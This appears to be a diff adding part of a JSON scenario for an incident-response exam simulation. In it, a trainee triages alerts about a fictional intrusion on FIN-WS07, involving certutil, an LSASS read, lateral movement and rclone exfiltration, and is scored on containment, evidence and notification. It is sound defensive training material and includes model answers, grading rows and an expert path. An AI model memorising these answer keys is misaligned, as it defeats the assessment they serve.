+                  "label": "FIN-WS07 and FIN-SQL01 (svc-backup)"
+                },
+                {
+                  "value": "zero",
+                  "label": "None"
+                }
+              ]
+            }
+          ]
+        }
+      ],
+      "effects": [
+        {
+          "set": "causeDoc",
+          "to": "cause"
+        },
+        {
+          "set": "scopeDoc",
+          "to": "scope"
+        },
+        {
+          "set": "documented",
+          "to": "true"
+        },
+        {
+          "log": "Recorded: initial access {cause}, scope {scope}.",
+          "kind": "act"
+        }
+      ]
+    }
+  },
+  "timers": {
+    "work": {
+      "label": "Work in progress",
+      "wait": {
+        "skipLabel": "Let the work finish"
+      },
+      "instances": "one",
+      "source": {
+        "cite": "Author's scenario timing (REQ-238)",
+        "checkedAt": "2026-11-11",
+        "note": "How many sim minutes each task takes and when the fictional attacker (or other party) takes each step are teaching simplifications for exam practice, not measured values. The attacker's pace is set against the published breakout time in the sources."
+      },
+      "effects": [
+        {
+          "set": "busy",
+          "to": "false"
+        }
+      ]
+    }
+  },
+  "triggers": [
+    {
+      "id": "creds",
+      "when": "t >= credsDelay and isNull(wsIsoAt) and phase == \"incident\"",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "set": "credsAt",
+          "to": "t"
+        },
+        {
+          "log": "EDR: rundll32.exe on FIN-WS07 opened LSASS memory. svc-backup was signed in on that host last night.",
+          "kind": "bad"
+        }
+      ]
+    },
+    {
+      "id": "lateral",
+      "when": "t >= lateralDelay and isNull(wsIsoAt) and credsLeft and phase == \"incident\"",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "set": "lateralAt",
+          "to": "t"
+        },
+        {
+          "log": "Windows security log: svc-backup signed in to FIN-SQL01 from FIN-WS07, and rclone.exe appeared there.",
+          "kind": "bad"
+        }
+      ]
+    },
+    {
+      "id": "newC2",
+      "when": "not isNull(c2BlockAt) and attackerActive and t >= timeAt(c2BlockAt) + newC2Delay and phase == \"incident\"",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "set": "newC2At",
+          "to": "t"
+        },
+        {
+          "log": "Proxy: the beacon on FIN-WS07 now calls 203.0.113.46. Blocking one address did not cut it off.",
+          "kind": "bad"
+        }
+      ]
+    },
+    {
+      "id": "exfilStart",
+      "when": "t >= exfilDelay and attackerActive and phase == \"incident\"",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "set": "exfilAt",
+          "to": "t"
+        },
+        {
+          "log": "Proxy: rclone.exe is uploading finance data to 203.0.113.80.",
+          "kind": "alarm"
+        }
+      ]
+    },
+    {
+      "id": "exfilDone",
+      "when": "t >= exfilDoneDelay and attackerActive and phase == \"incident\"",
+      "mode": "once",
+      "interruptsSkip": true,
+      "effects": [
+        {
+          "set": "impactAt",
+          "to": "t"
+        },
+        {
+          "cancel": "work"
+        },
+        {
+          "set": "busy",
+          "to": "false"
+        },
+        {
+          "set": "closedAt",
+          "to": "t"
+        },
+        {
+          "log": "Proxy: the upload to 203.0.113.80 finished, 2.4 GB of finance data. The incident lead takes over; write up what happened.",
+          "kind": "alarm"
+        },
+        {
+          "phase": "report"
+        }
+      ]
+    },
+    {
+      "id": "writeUp",
+      "when": "phase == \"report\"",
+      "mode": "once",
+      "effects": [
+        {
+          "reason": "writeup"
+        }
+      ]
+    }
+  ],
+  "reasoning": {
+    "writeup": {
+      "question": "For the incident record: how you decided which alert was the intrusion, what you contained and why, and what you kept as evidence.",
+      "pausesClock": true,
+      "parts": [
+        {
+          "label": "Triage",
+          "criteria": "Ranks by evidence, not the severity label: certutil downloading from an outside address under an encoded PowerShell launched by Word is a living-off-the-land intrusion; a quarantined file with nothing since and a spray with no success were stopped by controls; the sweep is the scheduled scanner (a false positive to tune).",
+          "modelAnswer": "The medium certutil alert was the real one: Word started an encoded PowerShell, certutil downloaded a file from 203.0.113.45 and rundll32 ran it and beaconed. The critical quarantine and the VPN spray were already stopped, and the sweep was our scanner in its window."
+        },
+        {
+          "label": "Containment and scope",
+          "criteria": "Isolates the host with EDR at once (blocking the address alone fails because the implant changes address); treats credentials cached on the host as stolen once LSASS was read and disables or resets them; hunts every endpoint for the same pattern.",
+          "modelAnswer": "I isolated FIN-WS07 through EDR rather than only blocking the address, hunted all endpoints for the certutil and rundll32 pattern, and would disable svc-backup if LSASS had been read."
+        },
+        {
+          "label": "Evidence",
+          "criteria": "Captures memory and the EDR triage package before reimaging; builds a timeline back to the macro document.",
+          "modelAnswer": "I took memory and the triage package into the case file before any reimage, and the timeline put initial access at the 06:38 invoice document."
+        }
+      ]
+    }
+  },
+  "outcome": {
+    "profile": "security",
+    "thresholds": {
+      "containWindow": {
+        "value": 1800,
+        "source": {
+          "cite": "Security outcome profile (docs/sims.md 9.2, 22.7), tightened to 30 minutes for this case",
+          "checkedAt": "2026-11-11",
+          "note": "Set against the 29-minute average eCrime breakout time in CrowdStrike's 2026 Global Threat Report (see sources); the implant moves to a second host on that scale."
+        }
+      },
+      "containSpread": {
+        "value": 0,
+        "source": {
+          "cite": "Security outcome profile (docs/sims.md 9.2, 22.7)",
+          "checkedAt": "2026-11-11",
+          "note": "No host newly compromised after the first alert."
+        }
+      }
+    },
+    "noProgress": {
+      "when": "documented and (attackerActive or credsLeft)",
+      "class": "harm",
+      "rationale": "Closing while a compromised host is on the network or a stolen credential still works leaves the attacker a way in; it is never a safe outcome.",
+      "source": {
+        "cite": "NIST SP 800-61 Rev. 3, Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile (April 2025)",
+        "checkedAt": "2026-11-11",
+        "url": "https://csrc.nist.gov/pubs/sp/800/61/r3/final",
+        "note": "The current revision (April 3, 2025; supersedes Rev. 2 of 2012). Relevant text: RS.MA-02 'Perform a preliminary review of a new incident report to verify that a cybersecurity incident has occurred, then estimate the severity of the incident and the level of urgency'; RS.MA-03 'Prioritize how quickly incident response should be performed for each incident based on its scope, likely impact, time-critical nature, and resource availability'; RS.MA-04 escalation and elevation; RS.MI-01 'Containment refers to preventing the expansion of an incident'; RS.MI-02 eradication 'to eliminate persistence mechanisms and entry points' and 'Identify all affected hosts and services'; RS.AN-07 incident data collected with integrity and provenance preserved; RS.CO-02 stakeholders notified. Read in the PDF text (nvlpubs.nist.gov) and the CSRC page on 2026-11-11."
+      }
+    }
+  },
+  "endings": {
+    "exfil": {
+      "label": "Finance data uploaded out",
+      "class": "harm",
+      "terminal": true,
+      "when": "documented and not isNull(impactAt)",
+      "narrative": "The implant still had a working foothold 70 minutes in, and rclone finished uploading 2.4 GB of finance data to an outside address."
+    },
+    "evidenceLost": {
+      "label": "Evidence wiped before it was collected",
+      "class": "harm",
+      "terminal": true,
+      "when": "documented and evidenceDestroyed",
+      "narrative": "FIN-WS07 was reimaged before memory or the EDR package was kept, so what the implant did and whether it stole more credentials is gone."
+    },
+    "stillIn": {
+      "label": "Closed with the attacker still in",
+      "class": "harm",
+      "terminal": true,
+      "when": "documented and (attackerActive or credsLeft)",
+      "narrative": "The incident was closed while {attackerActive ? \"a compromised host was still on the network\" : \"the svc-backup credentials stolen from LSASS still worked\"}."
+    },
+    "contained": {
+      "label": "Triaged right, contained and scoped",
+      "class": "target",
+      "terminal": true,
+      "when": "documented and triageRight and not isNull(allOffAt) and timeAt(allOffAt) <= containWindow and spread <= containSpread and isNull(exfilAt) and not isNull(evidenceAt) and not evidenceDestroyed and not isNull(huntedAt)",
+      "narrative": "You saw past the severity labels to the medium alert that was a live intrusion, cut it off before it spread, kept the evidence and confirmed no other host was touched."
+    },
+    "containedLate": {
+      "label": "Contained, late or with spread",
+      "class": "recovered",
+      "terminal": true,
+      "when": "documented",
+      "narrative": "The attacker is out, but triage went to the wrong alerts first, containment came late, or the intrusion reached a second host."
+    },
+    "time_up": {
+      "label": "Time up",
+      "class": "harm",
+      "terminal": true,
+      "narrative": "The run reached its time limit with no incident record."
+    }
+  },
+  "endingOrder": [
+    "exfil",
+    "evidenceLost",
+    "stillIn",
+    "contained",
+    "containedLate"
+  ],
+  "scoring": {
+    "criteria": [
+      {
+        "id": "triageCrit",
+        "label": "Triaged every alert on its evidence, not its severity label",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "triageRight",
+            "score": "met",
+            "why": "certutil was the incident; the spray and the quarantine were handled by controls; the sweep was the scanner."
+          },
+          {
+            "when": "dCert == \"incident\"",
+            "score": "partial",
+            "why": "The intrusion was found, but another alert was misjudged."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "{dCert == \"none\" ? \"The certutil alert was never triaged.\" : \"The live intrusion was not called an incident.\"}"
+          }
+        ]
+      },
+      {
+        "id": "containFast",
+        "label": "Cut off every foothold and stolen credential within 30 minutes",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "not isNull(allOffAt) and timeAt(allOffAt) <= containWindow",
+            "score": "met",
+            "why": "Contained {timeAt(allOffAt) / 60|0dp} min in."
+          },
+          {
+            "when": "not isNull(allOffAt)",
+            "score": "partial",
+            "why": "Contained, but {timeAt(allOffAt) / 60|0dp} min in."
+          },
+          {
+            "when": "not isNull(wsIsoAt)",
+            "score": "partial",
+            "why": "FIN-WS07 was isolated; a foothold or stolen credential was left."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "No host was isolated."
+          }
+        ]
+      },
+      {
+        "id": "evidence",
+        "label": "Collected memory and the EDR triage package before reimaging",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "not isNull(evidenceAt) and not evidenceDestroyed and (isNull(lateralAt) or timeAt(evidenceAt) >= timeAt(lateralAt))",
+            "score": "met",
+            "why": "Kept in the case file with hashes."
+          },
+          {
+            "when": "not isNull(evidenceAt) and not evidenceDestroyed",
+            "score": "partial",
+            "why": "FIN-WS07 was kept, but not FIN-SQL01."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "{evidenceDestroyed ? \"FIN-WS07 was wiped first.\" : \"Nothing was collected.\"}"
+          }
+        ]
+      },
+      {
+        "id": "scope",
+        "label": "Hunted every endpoint for the same pattern after the last attacker step",
+        "weight": 1,
+        "critical": true,
+        "rows": [
+          {
+            "when": "not isNull(huntedAt) and (isNull(lateralAt) or timeAt(huntedAt) >= timeAt(lateralAt))",
+            "score": "met",
+            "why": "Every endpoint was checked."
+          },
+          {
+            "when": "not isNull(huntedAt)",
+            "score": "partial",
+            "why": "The hunt ran before the attacker reached FIN-SQL01."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "No hunt: other hosts were assumed clean."
+          }
+        ]
+      },
+      {
+        "id": "escalated",
+        "label": "Escalated to the incident lead within 15 minutes",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "not isNull(escalatedAt) and timeAt(escalatedAt) <= escalateWindow",
+            "score": "met",
+            "why": "Escalated {timeAt(escalatedAt) / 60|0dp} min in."
+          },
+          {
+            "when": "not isNull(escalatedAt)",
+            "score": "partial",
+            "why": "Escalated {timeAt(escalatedAt) / 60|0dp} min in."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "Never escalated."
+          }
+        ]
+      },
+      {
+        "id": "timelineCrit",
+        "label": "Built a timeline that found the initial access",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "not isNull(timelineAt)",
+            "score": "met",
+            "why": "The macro document at 06:38 is the start."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "No timeline; initial access is a guess."
+          }
+        ]
+      },
+      {
+        "id": "notifiedCrit",
+        "label": "Notified the incident lead, IT operations and the data owner (RS.CO-02)",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "notified == \"full\"",
+            "score": "met",
+            "why": "The finance director can judge the data."
+          },
+          {
+            "when": "notified == \"it\"",
+            "score": "partial",
+            "why": "Only IT operations were told."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "No one was told."
+          }
+        ]
+      },
+      {
+        "id": "record",
+        "label": "Recorded initial access and scope accurately",
+        "weight": 1,
+        "rows": [
+          {
+            "when": "causeDoc == \"maldoc\" and scopeDoc == (isNull(lateralAt) ? \"one\" : \"two\")",
+            "score": "met",
+            "why": "The record matches what happened."
+          },
+          {
+            "when": "true",
+            "score": "missed",
+            "why": "The record does not match what happened."
+          }
+        ]
+      }
+    ],
+    "reasoningCriteria": [
+      {
+        "moment": "writeup",
+        "label": "Written triage, containment and evidence",
+        "weight": 1
+      }
+    ],
+    "kpis": [
+      {
+        "id": "minToTriage",
+        "label": "Minutes until the intrusion was called an incident",
+        "value": "isNull(certAt) ? -1 : timeAt(certAt) / 60",
+        "format": "number",
+        "expert": "5 or less"
+      },
+      {
+        "id": "minToContain",
+        "label": "Minutes until every foothold was cut off",
+        "value": "isNull(allOffAt) ? -1 : timeAt(allOffAt) / 60",
+        "format": "number",
+        "expert": "30 or less"
+      },
+      {
+        "id": "hosts",
+        "label": "Hosts compromised",
+        "value": "1 + spread",
+        "format": "number",
+        "expert": "1"
+      }
+    ],
+    "expertPath": [
+      {
+        "at": "0-5 min",
+        "text": "Read the medium certutil alert before the critical one: an encoded PowerShell and certutil fetching from an outside address is a live intrusion. Call it an incident and isolate FIN-WS07 with EDR."
+      },
+      {
+        "at": "5-30 min",
+        "text": "Escalate; capture memory and the triage package; hunt every endpoint for the pattern; build the timeline back to the macro document."
+      },
+      {
+        "at": "30-40 min",
+        "text": "Close the other three: the spray and the quarantine were stopped by controls, the sweep is the scanner (tune the rule)."
+      },
+      {
+        "at": "After",
+        "text": "Notify the incident lead, IT operations and the finance director; record the macro document as initial access and FIN-WS07 as the only host."
+      }
+    ],
+    "debrief": {
+      "contained": {
+        "headline": "Good: the right alert, first",
+        "body": "You judged each alert on its evidence. The critical label was a quarantine that had already worked; the medium one was the intrusion."
+      },
+      "containedLate": {
+        "headline": "Contained, with gaps",
+        "body": "The attacker is out. The criteria show what cost you: time on the loud alerts, a later isolation, or a second host."
+      },
+      "exfil": {
+        "headline": "Data uploaded out",
+        "body": "Blocking one address or working the alerts by severity label left the implant running. Isolate the host, not the indicator."
+      },
+      "evidenceLost": {
+        "headline": "Evidence wiped",
+        "body": "Reimaging before a memory capture destroys what the implant did and which credentials it read. Collect, then rebuild."
+      },
+      "stillIn": {
+        "headline": "Closed too soon",
+        "body": "Once LSASS was read, every credential cached on the host is stolen. Disable or reset them, and isolate every host they reached."
+      },
+      "time_up": {
+        "headline": "Time up",
+        "body": "No record was written before the run's hard limit."
+      }
+    },
+    "modelReasoning": "Severity labels describe the rule, not the incident. The quarantine and the VPN spray were stopped by controls, and the sweep was the scheduled scanner; the medium certutil alert, with Word spawning an encoded PowerShell, certutil downloading and rundll32 beaconing, was the live intrusion. Isolate FIN-WS07 with EDR, escalate, capture memory and the triage package, hunt every endpoint for the pattern, treat credentials cached there as stolen if LSASS was touched, and build the timeline back to the macro document."
+  }
+}
